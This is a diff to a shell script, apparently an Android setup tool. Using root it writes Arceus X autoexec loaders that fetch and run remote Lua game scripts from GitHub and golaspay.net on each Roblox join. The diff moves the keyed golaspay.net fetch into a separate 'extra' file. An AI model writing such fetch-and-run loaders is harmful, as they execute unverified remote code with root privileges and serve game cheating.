@@ -239,13 +239,15 @@ case "$PRESET" in
             MARKET_URL="https://raw.githubusercontent.com/alzafabocahbocah-boop/ronihub/main/$RONIHUB_SC"
             SC_LABEL="$RONIHUB_SC"
         fi
-        EXTRA_SC='local script_key="P0h1DdohmtTALFrITMSmL2z";pcall(loadstring(game:HttpGet("https://golaspay.net/scv/UlPNGiNxRw44?key="..script_key)))'
-        su -c "mkdir -p \"$AX_DIR\"; printf 'loadstring(game:HttpGet(\"%s\"))()\n%s' \"$MARKET_URL\" \"$EXTRA_SC\" > \"$AX_LOADER\"" 2>/dev/null
+        AX_EXTRA="$AX_DIR/zenx_extra.lua"
+        su -c "mkdir -p \"$AX_DIR\"; printf 'loadstring(game:HttpGet(\"%s\"))()' \"$MARKET_URL\" > \"$AX_LOADER\"" 2>/dev/null
+        su -c "printf 'local script_key=\"P0h1DdohmtTALFrITMSmL2z\"\npcall(loadstring(game:HttpGet(\"https://golaspay.net/scv/UlPNGiNxRw44?key=\"..script_key)))' > \"$AX_EXTRA\"" 2>/dev/null
         # cek beneran ketulis
         AX_CEK=$(su -c "cat \"$AX_LOADER\" 2>/dev/null" 2>/dev/null)
         if printf '%s' "$AX_CEK" | grep -q "HttpGet"; then
             ok "Loader Arceus ketulis: $AX_LOADER ($SC_LABEL)"
-            info "$SC_LABEL auto-nyala tiap Arceus join."
+            ok "Extra script: $AX_EXTRA"
+            info "$SC_LABEL + extra auto-nyala tiap Arceus join."
         else
             warn "Loader Arceus GAGAL ketulis (cek akses su / folder Arceus X ada)."
             info "Manual:  su -c 'echo ... > \"$AX_LOADER\"'"
